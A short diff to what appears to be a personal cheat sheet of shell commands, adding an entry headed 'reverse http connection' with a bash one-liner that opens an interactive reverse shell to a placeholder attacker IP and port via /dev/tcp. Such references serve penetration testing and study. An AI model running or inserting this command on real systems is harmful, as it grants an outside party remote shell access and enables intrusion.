@@ -50,7 +50,11 @@ ss -tulpn | grep 'LISTEN'
 
 * grep in windows: findstr "keyword"
 
+* reverse http connection
 
+```
+bash -c "bash -i >& /dev/tcp/[attacker_ip]/[port] 0>&1"
+```
 
 
 
